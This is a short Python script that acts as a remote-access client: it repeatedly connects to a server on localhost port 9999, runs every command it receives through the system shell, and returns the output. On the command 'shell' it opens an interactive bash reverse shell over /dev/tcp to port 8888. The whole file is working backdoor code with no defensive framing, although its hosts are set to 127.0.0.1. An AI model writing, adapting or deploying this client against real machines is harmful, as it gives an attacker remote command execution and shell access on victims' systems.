import socket
import time
from colorama import *
import subprocess

BUFFER = 4096


def processcmd(cmd, sock):

    if len(cmd) > 1:
        print(cmd)

        if cmd == "shell":
            subprocess.run("bash -i >& /dev/tcp/127.0.0.1/8888 0>&1", shell=True)
        
        else:
            j = subprocess.getoutput(cmd)
            sock.send(j.encode())



def main():
    
    print(Fore.GREEN + "Starting client" + Fore.RESET)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:

        try:
            s.connect(("127.0.0.1", 9999))
            print(Fore.GREEN + "Connected to server" + Fore.RESET)
            s.send(b"Hey")
            while True:
                cmd = s.recv(BUFFER)
                
                processcmd(cmd.decode(), s)

        except:
            pass
                

main()